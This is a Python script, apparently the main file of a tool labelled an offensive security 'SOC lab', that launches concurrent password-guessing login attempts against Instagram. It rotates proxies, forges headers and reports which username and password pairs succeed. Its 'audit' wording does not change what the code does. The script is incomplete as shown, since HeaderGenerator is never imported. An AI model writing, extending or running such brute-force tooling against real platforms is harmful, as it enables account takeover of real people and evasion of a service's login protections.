import asyncio
from colorama import Fore, Style, init
from core.proxy_mgr import ProxyManager
from core.engine import JarvisEngine
from targets import instagram # Import target lainnya nanti

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}██╗ █████╗ ██████╗ ██╗   ██╗██╗███████╗    ██╗   ██╗██╗  ██╗
██║██╔══██╗██╔══██╗██║   ██║██║██╔════╝    ██║   ██║██║  ██║
██║███████║██████╔╝██║   ██║██║███████╗    ██║   ██║███████║
██║██╔══██║██╔══██╗╚██╗ ██╔╝██║╚════██║    ╚██╗ ██╔╝╚════██║
██║██║  ██║██║  ██║ ╚████╔╝ ██║███████║     ╚████╔╝      ██║
╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝      ╚═══╝       ╚═╝
          {Fore.RED}[ OFFENSIVE SECURITY - SOC LAB V4 ]
"""

async def start_audit():
    print(BANNER)
    proxies = ["http://proxy1:port", "http://proxy2:port"] # Isi list proxymu
    pm = ProxyManager(proxies)
    engine = JarvisEngine(pm)
    
    # Contoh untuk 1 user dan list password
    target_user = "legal_soc_analyst"
    passwords = ["123456", "admin123", "secret", "password", "test1234"]
    
    tasks = []
    config = instagram.get_config()
    
    for pwd in passwords:
        headers = HeaderGenerator.get_headers(config['platform'])
        payload = instagram.get_ig_payload(target_user, pwd)
        tasks.append(engine.execute_audit(config['url'], payload, headers))
        
    responses = await asyncio.gather(*tasks)
    
    for i, res in enumerate(responses):
        if res and res.status_code == 200:
            print(f"{Fore.GREEN}[SUCCESS] {target_user}:{passwords[i]}")
        else:
            print(f"{Fore.RED}[FAILED] {target_user}:{passwords[i]}")

if __name__ == "__main__":
    asyncio.run(start_audit())
